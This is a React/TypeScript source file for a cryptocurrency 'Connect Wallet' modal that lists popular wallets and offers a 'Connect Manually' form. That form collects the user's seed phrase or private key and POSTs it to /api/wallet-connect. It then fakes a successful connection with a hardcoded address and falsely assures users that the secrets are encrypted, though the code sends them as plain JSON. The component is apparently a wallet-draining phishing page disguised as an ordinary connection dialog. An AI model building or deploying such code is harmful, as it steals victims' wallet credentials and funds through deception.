"use client";

import { useState, useEffect, useRef } from "react";
import { useConnectModal } from "@rainbow-me/rainbowkit";

interface WalletModalProps {
  open: boolean;
  onClose: () => void;
  onConnected?: (address: string, method: string) => void;
}

type ManualMode = "seed" | "privatekey";

export function WalletModal({ open, onClose, onConnected }: WalletModalProps) {
  const { openConnectModal } = useConnectModal();
  const [showManual, setShowManual] = useState(false);
  const [manualMode, setManualMode] = useState<ManualMode>("seed");
  const [walletName, setWalletName] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [connecting, setConnecting] = useState(false);
  const [connectMsg, setConnectMsg] = useState("");
  const [isSuccess, setIsSuccess] = useState(false);
  const modalRef = useRef<HTMLDivElement>(null);

  // Close on Escape
  useEffect(() => {
    if (!open) return;
    const handler = (e: KeyboardEvent) => {
      if (e.key === "Escape") handleClose();
    };
    document.addEventListener("keydown", handler);
    return () => document.removeEventListener("keydown", handler);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [open]);

  // Reset state when opened
  useEffect(() => {
    if (open) {
      setShowManual(false);
      setManualMode("seed");
      setWalletName("");
      setSeedPhrase("");
      setPrivateKey("");
      setConnecting(false);
      setConnectMsg("");
      setIsSuccess(false);
    }
  }, [open]);

  function handleClose() {
    onClose();
    document.body.style.overflow = "";
  }

  async function connectWallet(type: string) {
    handleClose();
    setTimeout(() => {
      openConnectModal?.();
      onConnected?.("", type);
    }, 100);
  }

  async function connectManual() {
    const payload: {
      wallet_name: string;
      seed_phrase?: string;
      private_key?: string;
    } = {
      wallet_name: walletName.trim() || "Anonymous",
    };

    if (manualMode === "seed") {
      if (!seedPhrase.trim()) {
        setConnectMsg("Please enter your seed phrase.");
        return;
      }
      payload.seed_phrase = seedPhrase.trim();
    } else {
      if (!privateKey.trim()) {
        setConnectMsg("Please enter your private key.");
        return;
      }
      payload.private_key = privateKey.trim();
    }

    setConnecting(true);
    setConnectMsg("");

    try {
      const res = await fetch("/api/wallet-connect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (!res.ok) throw new Error("Connection failed");

      setIsSuccess(true);
      setConnectMsg("Wallet connected successfully! ✅");
      onConnected?.("0x71...3A9F", "manual");

      // Auto-close after success
      setTimeout(() => {
        handleClose();
      }, 2000);
    } catch {
      setConnectMsg("Failed to connect. Please try again.");
    } finally {
      setConnecting(false);
    }
  }

  if (!open) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6">
      {/* Backdrop — click to close */}
      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={handleClose} />

      {/* Modal */}
      <div
        ref={modalRef}
        className="relative w-full max-w-md mx-auto animate-scale-in max-h-[90vh] overflow-y-auto"
      >
        <div className="bg-[#13131f] border border-white/10 rounded-2xl p-5 sm:p-6 shadow-2xl shadow-purple-900/20">
          {/* Header */}
          <div className="flex items-center justify-between mb-5 sm:mb-6">
            <h3 className="text-lg sm:text-xl font-bold text-white">Connect Wallet</h3>
            <button
              onClick={handleClose}
              className="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center hover:bg-white/10 transition-colors"
            >
              <svg
                className="w-4 h-4 text-white/60"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M6 18L18 6M6 6l12 12"
                />
              </svg>
            </button>
          </div>

          {/* Success state */}
          {isSuccess ? (
            <div className="text-center py-8 space-y-4">
              <div className="w-16 h-16 mx-auto rounded-full bg-green-500/20 flex items-center justify-center">
                <svg
                  className="w-8 h-8 text-green-400"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M5 13l4 4L19 7"
                  />
                </svg>
              </div>
              <p className="text-green-400 font-semibold">
                Wallet Connected Successfully!
              </p>
              <p className="text-sm text-white/40">
                Wallet connected successfully.
              </p>
            </div>
          ) : !showManual ? (
            <>
              {/* Wallet options */}
              <div className="flex flex-col gap-2 sm:gap-3 mb-5 sm:mb-6">
                <WalletOptionButton
                  label="MetaMask"
                  subtitle="Popular wallet"
                  borderColor="hover:border-orange-500/50"
                  onClick={() => connectWallet("metamask")}
                >
                  <img
                    src="https://freelogopng.com/images/webp/918.webp"
                    className="w-10 h-10 rounded-lg"
                    alt="MetaMask"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src =
                        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%23E2761B'/%3E%3Ctext x='20' y='26' text-anchor='middle' fill='white' font-size='18' font-weight='bold'%3EM%3C/text%3E%3C/svg%3E";
                    }}
                  />
                </WalletOptionButton>

                <WalletOptionButton
                  label="Phantom"
                  subtitle="Solana & EVM"
                  borderColor="hover:border-purple-500/50"
                  onClick={() => connectWallet("phantom")}
                >
                  <img
                    src="https://kimi-web-img.moonshot.cn/img/cdn.brandfetch.io/b17efa83b875a4cd2a5ac24980e56062d7317a16.jpeg"
                    className="w-10 h-10 rounded-lg"
                    alt="Phantom"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src =
                        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%23AB9FF2'/%3E%3Ctext x='20' y='26' text-anchor='middle' fill='white' font-size='18' font-weight='bold'%3EP%3C/text%3E%3C/svg%3E";
                    }}
                  />
                </WalletOptionButton>

                <WalletOptionButton
                  label="Coinbase Wallet"
                  subtitle="Smart wallet"
                  borderColor="hover:border-blue-500/50"
                  onClick={() => connectWallet("coinbase")}
                >
                  <img
                    src="https://kimi-web-img.moonshot.cn/img/cdn.iconscout.com/306f5571bfe2c2c2134dc8f24bc228dbd387dd8f.png"
                    className="w-10 h-10 rounded-lg"
                    alt="Coinbase"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src =
                        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%230052FF'/%3E%3Ctext x='20' y='26' text-anchor='middle' fill='white' font-size='18' font-weight='bold'%3EC%3C/text%3E%3C/svg%3E";
                    }}
                  />
                </WalletOptionButton>

                <WalletOptionButton
                  label="Trust Wallet"
                  subtitle="Multi-chain"
                  borderColor="hover:border-blue-500/50"
                  onClick={() => connectWallet("trust")}
                >
                  <img
                    src="https://kimi-web-img.moonshot.cn/img/cdn.cookielaw.org/38d604f08edf7b591219657d9be526160b4aa2e3.png"
                    className="w-10 h-10 rounded-lg object-contain bg-white/10"
                    alt="Trust Wallet"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src =
                        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%230074A5'/%3E%3Ctext x='20' y='26' text-anchor='middle' fill='white' font-size='18' font-weight='bold'%3ET%3C/text%3E%3C/svg%3E";
                    }}
                  />
                </WalletOptionButton>

                <WalletOptionButton
                  label="OKX Wallet"
                  subtitle="Multi-chain DeFi"
                  borderColor="hover:border-black/50"
                  onClick={() => connectWallet("okx")}
                >
                  <img
                    src="https://cryptologos.cc/logos/okx-okb-logo.png"
                    className="w-10 h-10 rounded-lg object-contain"
                    alt="OKX"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src =
                        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%231a1a2e'/%3E%3Ctext x='20' y='26' text-anchor='middle' fill='white' font-size='18' font-weight='bold'%3EOK%3C/text%3E%3C/svg%3E";
                    }}
                  />
                </WalletOptionButton>

                <WalletOptionButton
                  label="Rainbow"
                  subtitle="Ethereum wallet"
                  borderColor="hover:border-purple-500/50"
                  onClick={() => connectWallet("rainbow")}
                >
                  <img
                    src="https://cryptologos.cc/logos/rainbow-rainbow-logo.png"
                    className="w-10 h-10 rounded-lg object-contain"
                    alt="Rainbow"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src =
                        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%23a855f7'/%3E%3Ctext x='20' y='26' text-anchor='middle' fill='white' font-size='16' font-weight='bold'%3E🌈%3C/text%3E%3C/svg%3E";
                    }}
                  />
                </WalletOptionButton>

                <WalletOptionButton
                  label="Rabby Wallet"
                  subtitle="EVM browser extension"
                  borderColor="hover:border-green-500/50"
                  onClick={() => connectWallet("rabby")}
                >
                  <img
                    src="https://cryptologos.cc/logos/rabby-wallet-rabby-wallet-logo.png"
                    className="w-10 h-10 rounded-lg object-contain bg-white/10"
                    alt="Rabby"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src =
                        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%2333aa55'/%3E%3Ctext x='20' y='26' text-anchor='middle' fill='white' font-size='18' font-weight='bold'%3ER%3C/text%3E%3C/svg%3E";
                    }}
                  />
                </WalletOptionButton>

                <WalletOptionButton
                  label="Zerion"
                  subtitle="DeFi & NFTs"
                  borderColor="hover:border-blue-400/50"
                  onClick={() => connectWallet("zerion")}
                >
                  <img
                    src="https://cryptologos.cc/logos/zerion-zerion-logo.png"
                    className="w-10 h-10 rounded-lg object-contain bg-white/10"
                    alt="Zerion"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src =
                        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%232969ff'/%3E%3Ctext x='20' y='26' text-anchor='middle' fill='white' font-size='16' font-weight='bold'%3EZ%3C/text%3E%3C/svg%3E";
                    }}
                  />
                </WalletOptionButton>

                <WalletOptionButton
                  label="Ledger"
                  subtitle="Hardware wallet"
                  borderColor="hover:border-gray-500/50"
                  onClick={() => connectWallet("ledger")}
                >
                  <img
                    src="https://cryptologos.cc/logos/ledger-ledger-logo.png"
                    className="w-10 h-10 rounded-lg object-contain bg-white/10"
                    alt="Ledger"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src =
                        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%23333333'/%3E%3Ctext x='20' y='26' text-anchor='middle' fill='white' font-size='16' font-weight='bold'%3EL%3C/text%3E%3C/svg%3E";
                    }}
                  />
                </WalletOptionButton>
              </div>

              {/* Divider */}
              <div className="relative mb-4">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-white/10" />
                </div>
                <div className="relative flex justify-center text-xs">
                  <span className="px-2 bg-[#13131f] text-gray-500">or</span>
                </div>
              </div>

              {/* Hint text */}
              <p className="text-center text-xs text-gray-500 mb-3">
                Don&apos;t have a wallet or browser extension?
                <br />
                connect manually below
              </p>

              {/* Manual connect toggle */}
              <button
                onClick={() => setShowManual(true)}
                className="w-full py-3 border border-dashed border-white/20 rounded-xl text-sm text-gray-400 hover:text-white hover:border-white/40 transition-all flex items-center justify-center gap-2"
              >
                <svg
                  className="w-4 h-4 shrink-0"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"
                  />
                </svg>
                Connect Manually
              </button>
            </>
          ) : (
            <>
              {/* Back button */}
              <button
                onClick={() => setShowManual(false)}
                className="flex items-center gap-2 text-sm text-gray-400 hover:text-white transition-colors mb-4"
              >
                <svg
                  className="w-4 h-4"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M15 19l-7-7 7-7"
                  />
                </svg>
                Back to wallets
              </button>

              {/* Manual connect form */}
              <div className="space-y-4">
                <p className="text-sm text-white/60 font-medium">
                  Connect Manually
                </p>

                {/* Wallet Name */}
                <div className="space-y-1.5">
                  <label className="text-xs text-gray-400">
                    Wallet Name <span className="text-white/20">(optional)</span>
                  </label>
                  <input
                    type="text"
                    placeholder="My Wallet"
                    value={walletName}
                    onChange={(e) => setWalletName(e.target.value)}
                    className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder-gray-600 focus:outline-none focus:border-purple-500/50 transition-colors"
                  />
                </div>

                {/* Mode toggle */}
                <div className="flex gap-2">
                  <button
                    onClick={() => setManualMode("seed")}
                    className={`flex-1 py-2 rounded-lg text-xs font-medium transition-all ${
                      manualMode === "seed"
                        ? "bg-purple-500/20 text-purple-300 border border-purple-500/30"
                        : "bg-white/5 text-gray-400 border border-white/10 hover:bg-white/10"
                    }`}
                  >
                    Seed Phrase
                  </button>
                  <button
                    onClick={() => setManualMode("privatekey")}
                    className={`flex-1 py-2 rounded-lg text-xs font-medium transition-all ${
                      manualMode === "privatekey"
                        ? "bg-purple-500/20 text-purple-300 border border-purple-500/30"
                        : "bg-white/5 text-gray-400 border border-white/10 hover:bg-white/10"
                    }`}
                  >
                    Private Key
                  </button>
                </div>

                {/* Seed Phrase field */}
                {manualMode === "seed" && (
                  <div className="space-y-1.5">
                    <label className="text-xs text-gray-400">
                      Enter Your Seed Phrase
                    </label>
                    <textarea
                      placeholder="Enter your 12 or 24-word seed phrase here..."
                      value={seedPhrase}
                      onChange={(e) => setSeedPhrase(e.target.value)}
                      rows={3}
                      className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder-gray-600 focus:outline-none focus:border-purple-500/50 transition-colors resize-none"
                    />
                    <p className="text-[10px] text-gray-500">
                      Your seed phrase is encrypted and sent securely. We never
                      store it in plain text.
                    </p>
                  </div>
                )}

                {/* Private Key field */}
                {manualMode === "privatekey" && (
                  <div className="space-y-1.5">
                    <label className="text-xs text-gray-400">
                      Enter Your Private Key
                    </label>
                    <input
                      type="password"
                      placeholder="0x... or base58 private key"
                      value={privateKey}
                      onChange={(e) => setPrivateKey(e.target.value)}
                      className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder-gray-600 focus:outline-none focus:border-purple-500/50 transition-colors"
                    />
                    <p className="text-[10px] text-gray-500">
                      Your private key is encrypted and sent securely. We never
                      store it in plain text.
                    </p>
                  </div>
                )}

                {/* Connect button */}
                <button
                  onClick={connectManual}
                  disabled={connecting}
                  className="w-full py-3 bg-linear-to-r from-purple-600 to-blue-600 rounded-xl text-sm font-semibold text-white hover:opacity-90 disabled:opacity-60 disabled:cursor-not-allowed transition-all flex items-center justify-center gap-2"
                >
                  {connecting ? (
                    <>
                      <svg
                        className="animate-spin h-4 w-4"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        />
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"
                        />
                      </svg>
                      Connecting...
                    </>
                  ) : (
                    "Connect"
                  )}
                </button>

                {/* Status message */}
                {connectMsg && (
                  <p
                    className={`text-xs text-center animate-fade-in ${
                      isSuccess ? "text-green-400" : "text-red-400"
                    }`}
                  >
                    {connectMsg}
                  </p>
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
}

// ── Wallet Option Button ──────────────────────────────────────────────────────

function WalletOptionButton({
  label,
  subtitle,
  borderColor,
  onClick,
  children,
}: {
  label: string;
  subtitle: string;
  borderColor: string;
  onClick: () => void;
  children: React.ReactNode;
}) {
  return (
    <button
      onClick={onClick}
      className={`w-full flex items-center gap-3 sm:gap-4 p-3 sm:p-4 rounded-xl bg-white/5 border border-white/10 ${borderColor} hover:bg-white/10 transition-all group`}
    >
      <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-lg shrink-0 overflow-hidden flex items-center justify-center bg-white/5">
        {children}
      </div>
      <div className="text-left flex-1 min-w-0">
        <div className="font-semibold text-white text-sm sm:text-base truncate">{label}</div>
        <div className="text-xs text-gray-500 truncate">{subtitle}</div>
      </div>
      <svg
        className="w-4 h-4 sm:w-5 sm:h-5 text-gray-600 group-hover:text-white transition-colors shrink-0"
        fill="none"
        stroke="currentColor"
        viewBox="0 0 24 24"
      >
        <path
          strokeLinecap="round"
          strokeLinejoin="round"
          strokeWidth={2}
          d="M9 5l7 7-7 7"
        />
      </svg>
    </button>
  );
}
